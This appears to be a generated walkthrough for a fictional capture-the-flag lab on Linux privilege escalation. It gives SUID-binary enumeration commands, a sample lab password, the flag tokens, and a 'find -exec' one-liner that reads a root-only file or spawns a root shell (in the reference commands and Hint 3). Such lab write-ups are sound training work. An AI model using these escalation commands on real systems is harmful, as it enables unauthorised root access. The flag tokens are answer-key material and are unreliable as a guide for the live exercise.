# Cobalt Systems - SUID Maze

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-3-3-suid-maze/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Cobalt Systems - SUID Maze** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **50 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Cobalt Systems, a defense contractor headquartered in Arlington, Virginia, has
engaged your red team for an internal security assessment. Phase 1 concluded with
your team obtaining SSH credentials for the "analyst" account on one of their
monitoring servers through a successful social engineering campaign.

Phase 2 focuses on privilege escalation. The analyst account has standard user
permissions, but Cobalt's IT department has installed several tools with elevated
permissions across the server. Your objective is to determine which - if any - of
these tools can be leveraged to escalate to root and recover the system flag.

Marcus Webb (Senior Security Engineer) noted during the kickoff call: "We've got
five binaries running with SUID on that box. Three are standard system utilities,
and two are custom tools our ops team deployed. I'm confident they're all locked
down, but prove me wrong if you can."

A clue file in the analyst home directory contains the first half of the flag.
The second half requires root-level access. Assemble both tokens to complete the
exercise.

**Credentials**

- Target SSH: `analyst` / `C0b4lt_4n4lyst#`

## Your Objectives

- Enumerate SUID binaries on the target system
- Distinguish between standard, decoy, and exploitable SUID binaries
- Research exploitation techniques for the identified binary
- Exploit the SUID misconfiguration to escalate privileges
- Assemble the complete flag from two tokens

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SSH access as analyst**

```bash
sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@<target> 'whoami' 2>&1
```

Expected: `analyst`

**Enumerate SUID binaries and find 'find' among them**

```bash
sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@<target> 'find / -perm -4000 -type f 2>/dev/null | sort' 2>&1
```

Expected: `/usr/bin/find`

**Read token 1 from clue file**

```bash
sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@<target> 'cat /home/analyst/clue.txt' 2>&1
```

Expected: `su1d_m4z3`

**Exploit SUID find to read /root/flag.txt for token 2**

```bash
sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@<target> 'find . -exec cat /root/flag.txt \; -quit' 2>&1
```

Expected: `p01s0n`

**Assemble and verify the complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

Start with basic enumeration. Check your identity, group memberships, and
sudo permissions. Then search for SUID binaries:
find / -perm -4000 -type f 2>/dev/null
You should find five binaries with SUID set. Most are harmless - your job
is to figure out which one is not.

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

Look at the file /opt/cobalt/readme.txt for context on which SUID binaries
are standard system utilities and which are custom installations. One of the
five is a well-known GTFOBins candidate. Cross-reference what you find with
https://gtfobins.github.io/ to identify exploitation techniques.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

The "find" binary has the SUID bit set, which is abnormal. GTFOBins documents
a well-known privilege escalation technique for SUID find:
find . -exec /bin/sh -p \; -quit
The -p flag preserves the elevated effective UID. Once you have a root shell,
look in /root/ for the second token. Combine the token from ~/clue.txt with
the one from /root/flag.txt in the format OCR{token1_token2}.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
